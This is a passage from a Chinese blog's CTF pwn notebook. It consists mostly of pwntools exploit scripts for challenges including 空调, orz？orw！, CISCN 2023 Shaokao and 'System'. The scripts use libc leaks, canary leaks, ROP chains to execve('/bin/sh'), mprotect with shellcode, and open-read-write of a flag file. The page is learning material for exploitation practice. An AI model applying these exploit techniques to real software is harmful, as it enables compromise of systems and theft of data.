p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="空调"><a href="#空调" class="headerlink" title="空调"></a>空调</h3><p><img src="/img/loading.gif" data-original="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250307201728.png" alt="Pasted image 20250307201728"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
filename &#x3D; &#39;.&#x2F;pwn&#39;

debug &#x3D; 0
if debug:
    io &#x3D; remote(&#39;nc1.ctfplus.cn&#39;, 18839)
else:
    io &#x3D; process(filename)

elf &#x3D; ELF(filename)
context(arch &#x3D; elf.arch, log_level &#x3D; &#39;debug&#39;, os &#x3D; &#39;linux&#39;)
context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]

def dbg():
    gdb.attach(io)

libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)

io.sendlineafter(&#39;chioce&gt;:&#39;, &#39;5&#39;)
io.sendline(&#39;0x404018&#39;)

io.recvuntil(&#39;massege:&#39;)
libcbase &#x3D; u64(io.recv(6).ljust(8, b&#39;\0&#39;)) - libc.sym[&#39;puts&#39;]
success(&#39;libcbase &#x3D;&gt;&gt; &#39; + hex(libcbase))


system &#x3D; libcbase + libc.sym[&#39;system&#39;]
printf &#x3D; libcbase + libc.sym[&#39;printf&#39;]


def menu(num): 
    io.sendlineafter(&quot;&lt;Your chioce&gt;:&quot;,str(num).encode())
def delete(id): 
    menu(3) 
    io.sendlineafter(&quot;Index: &quot;,str(id).encode())
def edite(id,payload): 
    menu(4) 
    io.sendlineafter(&quot;Index: &quot;,str(id).encode()) 
    io.sendafter(&quot;message:&quot;,payload)

def add(name,introduce):
    menu(1) 
    io.sendlineafter(&quot;Your name:&quot;,name) 
    io.sendafter(&quot;Introduce:&quot;,introduce)

edite(-4,p64(0)+p64(printf)+p64(system))  #一个结构体0x30，写intro再+0x10
add(b&#39;&#x2F;bin&#x2F;sh&#39;,b&#39;a&#39;) 
delete(0)
io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="orz？orw！"><a href="#orz？orw！" class="headerlink" title="orz？orw！"></a>orz？orw！</h3><p><img src="/img/loading.gif" data-original="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250308120612.png" alt="Pasted image 20250308120612"><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
filename &#x3D; &#39;.&#x2F;orw&#39;

debug &#x3D; 0
if debug:
    io &#x3D; remote(&#39;nc1.ctfplus.cn&#39;, 18839)
else:
    io &#x3D; process(filename)

elf &#x3D; ELF(filename)
context(arch &#x3D; elf.arch, log_level &#x3D; &#39;debug&#39;, os &#x3D; &#39;linux&#39;)
context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]

def dbg():
    gdb.attach(io)

io.sendlineafter(&#39;size:&#39;, &#39;3&#39;)
io.sendafter(&#39;name:&#39;,(b&#39;1&#39;).ljust(0x11-7,b&#39;a&#39;))

size &#x3D; len(&quot;Hello 1aaaaaaaa&quot;) 
res &#x3D; io.recvline()
res &#x3D; io.recvline()

print(&quot;res&quot;,res) 
canary &#x3D; u64(res[size:size+8]) 
canary -&#x3D;0x61
success(&#39;canary &#x3D;&gt;&gt; &#39; + hex(canary))

io.sendafter(&#39;id&#39;,b&#39;A&#39; * 4 + p64(canary) + b&#39;A&#39; * 8 + p64(0x4012A7) + asm(shellcraft.open(&#39;.&#x2F;flag&#39;, 0) + shellcraft.read(3, 0x404500, 0x100) + shellcraft.write(1, 0x404500, 0x100)))

io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="CISCN"><a href="#CISCN" class="headerlink" title="CISCN"></a>CISCN</h2><h3 id="2023-Shaokao"><a href="#2023-Shaokao" class="headerlink" title="2023 Shaokao"></a>2023 Shaokao</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)
context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]
p&#x3D;process(&quot;.&#x2F;shaokao&quot;)
elf&#x3D;ELF(&#39;.&#x2F;shaokao&#39;)

def choose(choice):
    p.recvuntil(&quot;&gt;&quot;)
    p.sendline(str(choice))

def buy():
    choose(1)
    p.recvuntil(&quot;天涯\n&quot;)
    p.sendline(str(1))
    p.recvuntil(&quot;？\n&quot;)
    p.sendline(str(-10000))

buy()
choose(3)
choose(4)
choose(5)

payload&#x3D;b&#39;&#x2F;bin&#x2F;sh\x00&#39;+b&#39;a&#39;*0x20+p64(0x40264f)+p64(0x4E60F0)+p64(0x40a67e)+p64(0)+p64(0x4a404b)+p64(0)+p64(0)
payload+&#x3D;p64(0x458827)+p64(59)+p64(0x402404)
p.sendafter(&quot;赐名：\n&quot;,payload)
p.interactive()


&#39;&#39;&#39;
rdi&#x3D;binsh地址,rsi&#x3D;0,rdx&#x3D;0，rax&#x3D;59，syscall
0x0000000000458827 : pop rax ; ret
0x000000000040264f : pop rdi ; ret
0x000000000040a67e : pop rsi ; ret
0x00000000004a404b : pop rdx ; pop rbx ; ret
0x0000000000402404 : syscall
name&#x3D;0x4E60F0
&#39;&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="青海民族大学"><a href="#青海民族大学" class="headerlink" title="青海民族大学"></a>青海民族大学</h2><h3 id="System"><a href="#System" class="headerlink" title="System"></a>System</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *

p&#x3D;process(&#39;.&#x2F;system&#39;)
elf&#x3D;ELF(&#39;.&#x2F;system&#39;)
context.log_level&#x3D;&#39;debug&#39;


#静态编译，IDA查看即可
open_addr &#x3D; 0x0806D020
read_addr &#x3D; 0x0806D090
write_addr &#x3D; 0x0806D100
bss_addr &#x3D; 0x080EB000
put_addr &#x3D; 0x0804F7E0  
ret&#x3D;0x080481b2
pop1ret&#x3D;0x0804846f
pop3ret&#x3D;0x0806336b
pop2ret&#x3D;0x0805c508
sh&#x3D;0x080BE408
mprotect&#x3D;0x0806DBB0

#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;orw&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
# payload &#x3D; b&#39;A&#39; * 112

# payload +&#x3D; p32(put_addr)
# payload +&#x3D; p32(pop1ret)
# payload +&#x3D; p32(sh)

# payload +&#x3D; p32(read_addr)
# payload +&#x3D; p32(pop3ret)
# payload +&#x3D; p32(0)
# payload +&#x3D; p32(bss_addr)
# payload +&#x3D; p32(8)

# # open(bss_addr, 0)
# payload +&#x3D; p32(open_addr)
# payload +&#x3D; p32(pop2ret)
# payload +&#x3D; p32(bss_addr)
# payload +&#x3D; p32(0)      

# # read(fd, bss_addr, 100)
# payload +&#x3D; p32(read_addr)
# payload +&#x3D; p32(pop3ret)
# payload +&#x3D; p32(3)
# payload +&#x3D; p32(bss_addr)
# payload +&#x3D; p32(100)

# # write(1, bss_addr, 100)
# payload +&#x3D; p32(write_addr)
# payload +&#x3D; p32(ret)
# payload +&#x3D; p32(1) 
# payload +&#x3D; p32(bss_addr)
# payload +&#x3D; p32(100)

# p.sendline(payload)
# p.sendlineafter(b&#39;&#x2F;bin&#x2F;sh&#39;,b&#39;&#x2F;flag\x00&#39;)
# p.interactive()
#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;

#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;mprotect&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
payload &#x3D; b&#39;A&#39; * 112
payload +&#x3D; p32(mprotect)
payload +&#x3D; p32(pop3ret)
payload +&#x3D; p32(bss_addr)
payload +&#x3D; p32(0x1000)
payload +&#x3D; p32(7)

payload +&#x3D; p32(put_addr)
payload +&#x3D; p32(pop1ret)
payload +&#x3D; p32(sh)

payload +&#x3D; p32(read_addr)
payload +&#x3D; p32(bss_addr)
payload +&#x3D; p32(0)
payload +&#x3D; p32(bss_addr)
payload +&#x3D; p32(len(asm(shellcraft.sh())))


p.sendline(payload)
payload2&#x3D;asm(shellcraft.sh())
p.sendafter(b&#39;&#x2F;bin&#x2F;sh\n&#39;,payload2)
p.interactive()
#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://zechariah-0703.github.io">Zechariah</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://zechariah-0703.github.io/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/">https://zechariah-0703.github.io/2025/03/25/PWN刷题笔记（长期更新）/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zechariah-0703.github.io" target="_blank">Zechariahの博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a></div><div class="post_share"><div class="social-share" data-image="/img/fengmian.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/loading.gif" data-original="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/loading.gif" data-original="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/03/27/%E5%85%B3%E4%BA%8E%E6%88%91/" title="关于我"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">关于我</div></div></a></div><div class="next-post pull-right"><a href="/2025/03/11/Web-PWN%E5%AD%A6%E4%B9%A0/" title="Web-PWN知识"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Web-PWN知识</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2025/02/16/AWD%E5%AD%A6%E4%B9%A0/" title="AWD学习"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-16</div><div class="title">AWD学习</div></div></a></div><div><a href="/2025/02/22/Art-of-shellcode/" title="Art_of_shellcode"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-22</div><div class="title">Art_of_shellcode</div></div></a></div><div><a href="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" title="ELF文件保护机制"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-06</div><div class="title">ELF文件保护机制</div></div></a></div><div><a href="/2025/02/14/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B%E6%95%B4%E7%90%86/" title="C语言函数原型整理"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-14</div><div class="title">C语言函数原型整理</div></div></a></div><div><a href="/2025/02/03/PWN%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/" title="PWN入门-栈溢出"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-03</div><div class="title">PWN入门-栈溢出</div></div></a></div><div><a href="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" title="PWN入门-格式化字符串"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-12</div><div class="title">PWN入门-格式化字符串</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Zechariah</div><div class="author-info__description">不会密码的逆向手不是好PWN手</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Zechariah-0703"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#GHCTF"><span class="toc-number">1.</span> <span class="toc-text">GHCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hello-World"><span class="toc-number">1.1.</span> <span class="toc-text">Hello_World</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc1"><span class="toc-number">1.2.</span> <span class="toc-text">ret2libc1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc2"><span class="toc-number">1.3.</span> <span class="toc-text">ret2libc2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hopper"><span class="toc-number">1.4.</span> <span class="toc-text">hopper</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NPC2CTF"><span class="toc-number">2.</span> <span class="toc-text">NPC2CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEEK1"><span class="toc-number">2.1.</span> <span class="toc-text">WEEK1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ORW%EF%BC%88Day1-25-2-23%EF%BC%89"><span class="toc-number">2.1.1.</span> <span class="toc-text">ORW（Day1 25&#x2F;2&#x2F;23）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#simple-shellcode%EF%BC%88Day0-25-2-22%EF%BC%89"><span class="toc-number">2.1.2.</span> <span class="toc-text">simple_shellcode（Day0 25&#x2F;2&#x2F;22）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">预期</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EZ-Stack%EF%BC%88Day1-25-2-23%EF%BC%89"><span class="toc-number">2.1.3.</span> <span class="toc-text">EZ_Stack（Day1 25&#x2F;2&#x2F;23）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">基本思路</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">泄露libc</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2rbp"><span class="toc-number">2.1.3.3.</span> <span class="toc-text">泄露rbp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0exp"><span class="toc-number">2.1.3.4.</span> <span class="toc-text">本地exp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8Bexp"><span class="toc-number">2.1.3.5.</span> <span class="toc-text">远程exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEEK2"><span class="toc-number">2.2.</span> <span class="toc-text">WEEK2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#List%EF%BC%88Day2-25-2-24%EF%BC%89"><span class="toc-number">2.2.1.</span> <span class="toc-text">List（Day2 25&#x2F;2&#x2F;24）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Normal-shellcode"><span class="toc-number">2.2.2.</span> <span class="toc-text">Normal_shellcode</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF"><span class="toc-number">3.</span> <span class="toc-text">NISACTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezheap"><span class="toc-number">3.1.</span> <span class="toc-text">ezheap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#girl-friend"><span class="toc-number">3.2.</span> <span class="toc-text">girl_friend</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B9%A4%E5%9F%8E%E6%9D%AF"><span class="toc-number">4.</span> <span class="toc-text">鹤城杯</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#littleof-2021%E9%B9%A4%E5%9F%8E%E6%9D%AF"><span class="toc-number">4.1.</span> <span class="toc-text">littleof(2021鹤城杯)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Geek-Challenge"><span class="toc-number">5.</span> <span class="toc-text">Geek Challenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-shellcode"><span class="toc-number">5.1.</span> <span class="toc-text">ez_shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%B0%E9%BB%91%E5%90%97%E5%96%BD%E4%BA%86%E5%90%97%EF%BC%88%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%EF%BC%8C%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%89"><span class="toc-number">5.2.</span> <span class="toc-text">买黑吗喽了吗（整数溢出，栈溢出）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#su"><span class="toc-number">5.3.</span> <span class="toc-text">su~~~~</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-fmt"><span class="toc-number">5.4.</span> <span class="toc-text">ez_fmt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%9F%E7%9A%84%E8%83%BD%E8%B5%B0%E5%88%B0%E5%90%8E%E9%97%A8%E5%90%97"><span class="toc-number">5.5.</span> <span class="toc-text">真的能走到后门吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E8%B0%83"><span class="toc-number">5.6.</span> <span class="toc-text">空调</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#orz%EF%BC%9Forw%EF%BC%81"><span class="toc-number">5.7.</span> <span class="toc-text">orz？orw！</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN"><span class="toc-number">6.</span> <span class="toc-text">CISCN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2023-Shaokao"><span class="toc-number">6.1.</span> <span class="toc-text">2023 Shaokao</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%92%E6%B5%B7%E6%B0%91%E6%97%8F%E5%A4%A7%E5%AD%A6"><span class="toc-number">7.</span> <span class="toc-text">青海民族大学</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#System"><span class="toc-number">7.1.</span> <span class="toc-text">System</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/03/27/%E5%85%B3%E4%BA%8E%E6%88%91/" title="关于我"><img src="/img/loading.gif" data-original="/img/fengmian.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于我"/></a><div class="content"><a class="title" href="/2025/03/27/%E5%85%B3%E4%BA%8E%E6%88%91/" title="关于我">关于我</a><time datetime="2025-03-27T11:02:23.000Z" title="发表于 2025-03-27 19:02:23">2025-03-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/" title="PWN刷题笔记（长期更新）"><img src="/img/loading.gif" data-original="/img/fengmian.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PWN刷题笔记（长期更新）"/></a><div class="content"><a class="title" href="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/" title="PWN刷题笔记（长期更新）">PWN刷题笔记（长期更新）</a><time datetime="2025-03-25T13:39:37.000Z" title="发表于 2025-03-25 21:39:37">2025-03-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/11/Web-PWN%E5%AD%A6%E4%B9%A0/" title="Web-PWN知识"><img src="/img/loading.gif" data-original="/img/fengmian.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web-PWN知识"/></a><div class="content"><a class="title" href="/2025/03/11/Web-PWN%E5%AD%A6%E4%B9%A0/" title="Web-PWN知识">Web-PWN知识</a><time datetime="2025-03-11T13:48:48.000Z" title="发表于 2025-03-11 21:48:48">2025-03-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/11/unlink/" title="unlink"><img src="/img/loading.gif" data-original="/img/fengmian.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="unlink"/></a><div class="content"><a class="title" href="/2025/03/11/unlink/" title="unlink">unlink</a><time datetime="2025-03-10T16:25:24.000Z" title="发表于 2025-03-11 00:25:24">2025-03-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/10/%E5%A0%86%E5%85%A5%E9%97%A8-malloc-hook%E5%92%8C-free-hook%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86/" title="堆入门-__malloc_hook和__free_hook劫持原理"><img src="/img/loading.gif" data-original="/img/fengmian.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="堆入门-__malloc_hook和__free_hook劫持原理"/></a><div class="content"><a class="title" href="/2025/03/10/%E5%A0%86%E5%85%A5%E9%97%A8-malloc-hook%E5%92%8C-free-hook%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86/" title="堆入门-__malloc_hook和__free_hook劫持原理">堆入门-__malloc_hook和__free_hook劫持原理</a><time datetime="2025-03-10T13:44:38.000Z" title="发表于 2025-03-10 21:44:38">2025-03-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Zechariah</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
